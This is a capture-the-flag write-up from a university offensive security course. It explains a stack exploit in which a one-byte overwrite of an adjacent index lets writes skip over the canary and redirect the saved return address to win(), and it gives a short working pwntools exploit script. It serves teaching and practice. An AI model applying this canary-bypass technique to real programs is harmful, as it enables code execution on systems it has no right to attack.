# Cafe Menu

**Category:** pwn / self-referential index overflow (canary skip) · **Course:** Offensive Security (PoliTo)

## Challenge

An unusual primitive: a struct `{ char menu[48]; volatile unsigned int idx; }` is filled **one byte at a time** in a loop, `menu[idx++] = c`, until a `0xff` terminator or `idx >= 200`. There's no leak here — instead the write primitive itself is used to step the cursor *over* the canary without ever touching it.

## Vulnerability

`idx` lives inside the same struct, right after `menu[48]`, and is only bounds-checked against a generous `200`. Once `idx` reaches 48, the next write lands on `idx` itself: writing `menu[48]` overwrites the low byte of `idx`. So a single byte can **teleport the write cursor** to any offset, letting us jump straight from the buffer to the saved return address and skip the canary (and saved RBP) in between — they're never written, so the canary check still passes.

## Exploitation

1. Send 48 bytes of `A` to fill `menu[0..47]`; now `idx == 48`.
2. Send one byte `71`. That write sets `idx`'s low byte to 71, then the loop's `idx++` makes it **72** — exactly the offset of the saved return address. (71, not 72, precisely because of the post-increment.) Offsets 49–71, which hold the canary and saved RBP, are jumped over and left intact.
3. Send the 8 bytes of `win()`'s address one at a time; they land on `menu[72..79]` = saved RIP.
4. Send `0xff` to break the loop so `vuln()` returns straight into `win()`.

As in `solve.py`:

```python
for i in range(48):
    p.send(b"A")                     # fill menu[0..47], idx -> 48

p.send(bytes([71]))                  # 71, not 72: idx = 71, then idx++ -> 72 (reaches RIP)

for bval in p64(win):
    p.send(bytes([bval]))            # write win() onto saved RIP, byte by byte

p.send(bytes([0xff]))                # terminator -> loop breaks, vuln() returns to win()
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fstack-protector-all -no-pie`: canary enabled, fixed load address)
- `cafe_menu` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
